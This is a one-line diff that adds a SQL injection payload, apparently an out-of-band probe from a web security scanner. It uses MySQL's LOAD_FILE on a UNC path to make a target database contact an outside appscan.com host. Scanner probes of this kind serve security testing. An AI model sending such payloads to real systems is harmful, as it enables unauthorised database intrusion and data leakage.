@@ -1,0 +1,1 @@
+1234 and 1=2 or LOAD_FILE('\\\\v3-ping-1006-9e4d31e4-c992-44dd-a919-96c2aef78f80.adns.appscan.com\\dir') limit 1 #
